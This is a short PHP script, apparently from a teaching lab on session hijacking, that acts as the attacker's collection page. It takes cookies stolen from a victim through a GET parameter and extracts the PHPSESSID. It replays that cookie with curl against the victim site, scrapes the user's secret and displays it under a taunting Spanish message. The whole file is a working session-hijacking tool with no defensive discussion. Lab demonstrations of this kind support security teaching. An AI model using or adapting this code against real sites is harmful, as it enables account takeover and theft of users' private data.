<?php

$victimURL = "http://phpinfosec/session_hijacking/index.php";
$stolenCookie = $_GET['cookies'];

echo "<h1>Stolen cookie:</h1><pre>$stolenCookie</pre>";
$stolenCookies = preg_split('/;/', $stolenCookie);
foreach ($stolenCookies as $stolenCookie) {
	if ( false !== ( $pos = strpos($stolenCookie, 'PHPSESSID') ) ) {
		break;
	}
}
$ch = curl_init($victimURL);
curl_setopt($ch, CURLOPT_COOKIE, $stolenCookie);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$result = curl_exec($ch);
if ($e = curl_error($ch)) {
    die($e);
}

preg_match('/Tu secreto es "(.*)"/', $result, $matches);
?>
<h1>Jaja, s&eacute; tu secreto!</h1>
<h2>Es "<span style="background-color: red"><?php echo $matches[1]; ?></span>"</h2>
